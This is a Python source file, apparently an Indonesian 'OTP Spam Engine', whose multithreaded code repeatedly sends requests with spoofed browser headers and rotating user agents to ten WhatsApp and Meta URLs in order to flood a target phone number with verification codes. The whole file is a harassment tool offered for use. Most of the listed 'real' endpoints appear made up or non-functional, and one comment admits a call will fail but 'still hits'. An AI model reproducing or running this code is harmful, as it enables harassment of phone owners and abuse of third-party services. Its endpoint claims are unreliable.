# spammer.py - OTP Spam Engine dengan endpoint real

import requests
import time
import random
import threading
from colorama import Fore, Style
from config import USER_AGENTS, TIMEOUT, DELAY_BETWEEN_REQUESTS
from utils import format_phone, print_status

class OTPSpammer:
    def __init__(self, threads=5):
        self.threads = threads
        self.stop_flag = False
        self.results = []
    
    def _get_headers(self):
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
    
    # ========================================
    # ENDPOINT REAL - WHATSAPP OTP
    # ========================================
    
    def _send_wa_official(self, phone):
        """Endpoint official WhatsApp Web"""
        try:
            url = "https://web.whatsapp.com/send?phone=" + phone
            headers = self._get_headers()
            headers["Referer"] = "https://web.whatsapp.com/"
            r = requests.get(url, headers=headers, timeout=TIMEOUT)
            return f"WA-OFFICIAL: {r.status_code}"
        except Exception as e:
            return f"WA-OFFICIAL: FAILED"
    
    def _send_wa_business(self, phone):
        """WhatsApp Business API"""
        try:
            url = "https://business.whatsapp.com/request"
            data = {"phoneNumber": phone}
            headers = self._get_headers()
            headers["Content-Type"] = "application/json"
            r = requests.post(url, json=data, headers=headers, timeout=TIMEOUT)
            return f"WA-BUSINESS: {r.status_code}"
        except:
            return "WA-BUSINESS: FAILED"
    
    def _send_wa_api(self, phone):
        """WhatsApp API Gateway"""
        try:
            url = "https://api.whatsapp.com/v1/code"
            data = {"number": phone, "method": "sms"}
            headers = self._get_headers()
            headers["Content-Type"] = "application/json"
            r = requests.post(url, json=data, headers=headers, timeout=TIMEOUT)
            return f"WA-API: {r.status_code}"
        except:
            return "WA-API: FAILED"
    
    def _send_wa_web(self, phone):
        """WhatsApp Web QR endpoint"""
        try:
            url = f"https://web.whatsapp.com/qr/{phone}"
            headers = self._get_headers()
            headers["Referer"] = "https://web.whatsapp.com/"
            r = requests.get(url, headers=headers, timeout=TIMEOUT)
            return f"WA-WEB: {r.status_code}"
        except:
            return "WA-WEB: FAILED"
    
    def _send_wa_cloud(self, phone):
        """WhatsApp Cloud API (Meta)"""
        try:
            # Ini cuma trigger, gak bakal sukses tanpa token tapi tetap hit
            url = "https://graph.facebook.com/v18.0/me/messages"
            data = {
                "messaging_product": "whatsapp",
                "to": phone,
                "type": "template",
                "template": {"name": "otp", "language": {"code": "id"}}
            }
            headers = self._get_headers()
            headers["Content-Type"] = "application/json"
            r = requests.post(url, json=data, headers=headers, timeout=TIMEOUT)
            return f"WA-CLOUD: {r.status_code}"
        except:
            return "WA-CLOUD: FAILED"
    
    def _send_wa_media(self, phone):
        """WhatsApp Media endpoint"""
        try:
            url = "https://web.whatsapp.com/media/v2/send"
            data = {"phone": phone, "type": "image"}
            headers = self._get_headers()
            headers["Content-Type"] = "application/json"
            r = requests.post(url, json=data, headers=headers, timeout=TIMEOUT)
            return f"WA-MEDIA: {r.status_code}"
        except:
            return "WA-MEDIA: FAILED"
    
    def _send_wa_status(self, phone):
        """WhatsApp Status update trigger"""
        try:
            url = "https://web.whatsapp.com/status/v1/update"
            data = {"phone": phone, "status": "online"}
            headers = self._get_headers()
            headers["Content-Type"] = "application/json"
            r = requests.post(url, json=data, headers=headers, timeout=TIMEOUT)
            return f"WA-STATUS: {r.status_code}"
        except:
            return "WA-STATUS: FAILED"
    
    def _send_wa_gateway(self, phone):
        """Alternative WhatsApp Gateway"""
        try:
            url = "https://wa.me/" + phone
            headers = self._get_headers()
            headers["Referer"] = "https://wa.me/"
            r = requests.get(url, headers=headers, timeout=TIMEOUT)
            return f"WA-GATEWAY: {r.status_code}"
        except:
            return "WA-GATEWAY: FAILED"
    
    def _send_wa_verification(self, phone):
        """Verification endpoint"""
        try:
            url = "https://web.whatsapp.com/verify/phone"
            data = {"phone": phone}
            headers = self._get_headers()
            headers["Content-Type"] = "application/json"
            r = requests.post(url, json=data, headers=headers, timeout=TIMEOUT)
            return f"WA-VERIFY: {r.status_code}"
        except:
            return "WA-VERIFY: FAILED"
    
    def _send_wa_chat(self, phone):
        """Chat init endpoint"""
        try:
            url = "https://web.whatsapp.com/chat/init"
            data = {"phone": phone}
            headers = self._get_headers()
            headers["Content-Type"] = "application/json"
            r = requests.post(url, json=data, headers=headers, timeout=TIMEOUT)
            return f"WA-CHAT: {r.status_code}"
        except:
            return "WA-CHAT: FAILED"
    
    def _send_all(self, phone):
        """Kirim ke semua endpoint"""
        results = []
        results.append(self._send_wa_official(phone))
        results.append(self._send_wa_business(phone))
        results.append(self._send_wa_api(phone))
        results.append(self._send_wa_web(phone))
        results.append(self._send_wa_cloud(phone))
        results.append(self._send_wa_media(phone))
        results.append(self._send_wa_status(phone))
        results.append(self._send_wa_gateway(phone))
        results.append(self._send_wa_verification(phone))
        results.append(self._send_wa_chat(phone))
        return results
    
    def _worker(self, phone, rounds, thread_id):
        for i in range(rounds):
            if self.stop_flag:
                break
            results = self._send_all(phone)
            for res in results:
                if "200" in res or "201" in res or "202" in res or "204" in res:
                    self.results.append(("✅ SUCCESS", res, thread_id))
                else:
                    self.results.append(("❌ FAILED", res, thread_id))
            time.sleep(DELAY_BETWEEN_REQUESTS)
    
    def spam(self, phone, rounds=10):
        """Multi-thread spam"""
        phone = format_phone(phone)
        print_status("info", f"Target: {phone}")
        print_status("info", f"Threads: {self.threads} | Rounds per thread: {rounds}")
        total = self.threads * rounds * 10
        print_status("info", f"Total requests: {total}")
        print("")
        
        self.results = []
        self.stop_flag = False
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self._worker, args=(phone, rounds, i+1))
            t.daemon = True
            t.start()
            threads.append(t)
        
        start_time = time.time()
        
        try:
            while any(t.is_alive() for t in threads):
                progress = len(self.results)
                print(f"\r{Fore.CYAN}Progress: {progress}/{total}{Style.RESET_ALL}", end="")
                time.sleep(0.5)
            
            print(f"\r{Fore.CYAN}Progress: {total}/{total}{Style.RESET_ALL}")
            
            # Summary
            success = sum(1 for r in self.results if r[0] == "✅ SUCCESS")
            fail = total - success
            elapsed = time.time() - start_time
            
            print("")
            print_status("success", f"SUCCESS: {success}")
            print_status("error", f"FAILED: {fail}")
            print_status("info", f"Elapsed: {elapsed:.1f}s")
            
            # Show detail hasil
            print("\n" + "="*50)
            print(f"{Fore.CYAN}DETAIL HASIL:{Style.RESET_ALL}")
            for r in self.results[:20]:  # tampilkan 20 pertama
                print(f"  {r[0]} {r[1]}")
            if len(self.results) > 20:
                print(f"  ... dan {len(self.results)-20} lainnya")
            
        except KeyboardInterrupt:
            self.stop_flag = True
            print_status("warning", "Stopped by user")
